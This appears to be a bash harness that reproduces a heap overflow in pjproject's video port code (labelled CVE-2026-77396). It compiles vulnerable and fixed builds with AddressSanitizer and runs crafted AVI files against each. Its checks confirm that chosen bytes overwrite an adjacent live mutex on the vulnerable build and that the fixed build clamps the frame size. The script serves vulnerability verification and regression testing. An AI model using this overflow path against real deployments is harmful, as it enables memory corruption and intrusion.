#!/usr/bin/env bash
# Natural shipped-caller replay for CVE-2026-77396.
#
# pjmedia_vid_port_create() allocates its frame buffer from a fresh pool
# (vid_port.c:688) and then a live pj_mutex_t from that same pool (:701).
# The AVI virtual capture device pulls into that buffer from the shipped
# active clock (vid_port.c:1176 -> avi_dev.c:636 -> avi_get_frame), so the
# overflow victim is not driver-groomed.  Both pinned trees must already be
# built by real/build-real.sh.
set -u
cd "$(dirname "$0")/.."

T=x86_64-pc-linux-gnu
VULN=src/full/pjproject-c1ea7648fb53f945493972a23133b9e0d3e4a1fe
FIXED=src/full/pjproject-7ecc6584969a923c4190b6912afbf5952b5a4b9f
PASS=0
FAIL=0

compile() {
    name=$1; root=$2
    gcc -fsanitize=address -g -O0 -fno-omit-frame-pointer \
        -DPJ_AUTOCONF=1 -DPJMEDIA_HAS_VIDEO=1 \
        -I"$root/pjlib/include" -I"$root/pjlib-util/include" \
        -I"$root/pjmedia/include" -I"$root/pjnath/include" \
        -I"$root/pjsip/include" -I"$root/third_party/yuv/include" \
        real/vidport-driver.c -o "real/vidport-asan-$name" \
        -Wl,--start-group \
        "$root/pjmedia/lib/libpjmedia-$T.a" \
        "$root/pjmedia/lib/libpjmedia-videodev-$T.a" \
        "$root/pjmedia/lib/libpjmedia-codec-$T.a" \
        "$root/pjmedia/lib/libpjsdp-$T.a" \
        "$root/pjnath/lib/libpjnath-$T.a" \
        "$root/pjlib-util/lib/libpjlib-util-$T.a" \
        "$root/pjlib/lib/libpj-$T.a" \
        "$root/third_party/lib/libyuv-$T.a" \
        -Wl,--end-group -lm -pthread -luuid
    echo "COMPILE $name rc=$?"
}

run() {
    name=$1; avi=$2; log=$3
    mkdir -p "real/out-$name"
    timeout 15 env ASAN_OPTIONS=detect_leaks=0 \
        "./real/vidport-asan-$name" "real/$avi" > "real/out-$name/$log" 2>&1
    rc=$?
    echo "RUN $name $avi rc=$rc log=real/out-$name/$log"
    grep -E -m1 'NATURAL|ERROR: AddressSanitizer' "real/out-$name/$log" || true
}

check() {
    label=$1; file=$2; pattern=$3
    if grep -q "$pattern" "$file"; then
        echo "PASS $label"
        PASS=$((PASS + 1))
    else
        echo "FAIL $label (missing: $pattern)"
        FAIL=$((FAIL + 1))
    fi
}

check_absent() {
    label=$1; file=$2; pattern=$3
    if grep -q "$pattern" "$file"; then
        echo "FAIL $label (unexpected: $pattern)"
        FAIL=$((FAIL + 1))
    else
        echo "PASS $label"
        PASS=$((PASS + 1))
    fi
}

check_same() {
    label=$1; file=$2
    before=$(grep -m1 '^MUTEX_BEFORE:' "$file" || true)
    after=$(grep -m1 '^MUTEX_AFTER:' "$file" || true)
    if [ -n "$before" ] && [ "${before#MUTEX_BEFORE:}" = "${after#MUTEX_AFTER:}" ]; then
        echo "PASS $label"
        PASS=$((PASS + 1))
    else
        echo "FAIL $label (live mutex bytes changed)"
        FAIL=$((FAIL + 1))
    fi
}

python3 real/make_avi.py real/safe48.avi 48 >/dev/null
python3 real/make_avi.py real/attack64.avi 64 >/dev/null
python3 real/make_avi.py real/attack512.avi 512 >/dev/null

compile vuln "$VULN"
run vuln safe48.avi    vidport-asan-safe48.log
run vuln attack64.avi  vidport-asan-attack64.log
run vuln attack512.avi vidport-asan-attack512.log

compile fixed "$FIXED"
run fixed safe48.avi    vidport-asan-safe48.log
run fixed attack64.avi  vidport-asan-attack64.log
run fixed attack512.avi vidport-asan-attack512.log

V=real/out-vuln
F=real/out-fixed
check 'vuln natural adjacency'        "$V/vidport-asan-safe48.log"     'NATURAL .* delta=48'
check 'vuln safe frame size'          "$V/vidport-asan-safe48.log"     'FRAME_SIZE_AFTER=48'
check_same 'vuln safe mutex unchanged' "$V/vidport-asan-safe48.log"
check_absent 'vuln safe ASan clean'   "$V/vidport-asan-safe48.log"     'ERROR: AddressSanitizer'
check 'vuln attack64 frame size'      "$V/vidport-asan-attack64.log"   'FRAME_SIZE_AFTER=64'
check 'vuln attack64 chosen bytes'    "$V/vidport-asan-attack64.log"   '452d504a50524f4a45435421'
check 'vuln attack512 ASan WRITE'    "$V/vidport-asan-attack512.log"  'WRITE of size 512'
check 'vuln attack512 reader frame'   "$V/vidport-asan-attack512.log"  'avi_get_frame .*avi_player.c:1222'
check 'vuln attack512 shipped clock'  "$V/vidport-asan-attack512.log"  'enc_clock_cb .*vid_port.c:1176'
check 'vuln attack512 chosen bytes'   "$V/vidport-asan-attack512.log"  'MUTEX_AFTER:4d495348452d504a50524f4a45435421'

check 'fixed natural adjacency'       "$F/vidport-asan-attack64.log"   'NATURAL .* delta=48'
check 'fixed attack64 clamped size'   "$F/vidport-asan-attack64.log"   'FRAME_SIZE_AFTER=48'
check_same 'fixed attack64 unchanged' "$F/vidport-asan-attack64.log"
check 'fixed attack512 clamped size'  "$F/vidport-asan-attack512.log"  'FRAME_SIZE_AFTER=48'
check_same 'fixed attack512 unchanged' "$F/vidport-asan-attack512.log"
check_absent 'fixed attack512 ASan clean' "$F/vidport-asan-attack512.log" 'ERROR: AddressSanitizer'

echo "TOTAL: $PASS PASS / $FAIL FAIL"
echo "== hashes =="
sha256sum real/vidport-driver.c real/run-vidport.sh real/attack64.avi real/attack512.avi real/safe48.avi
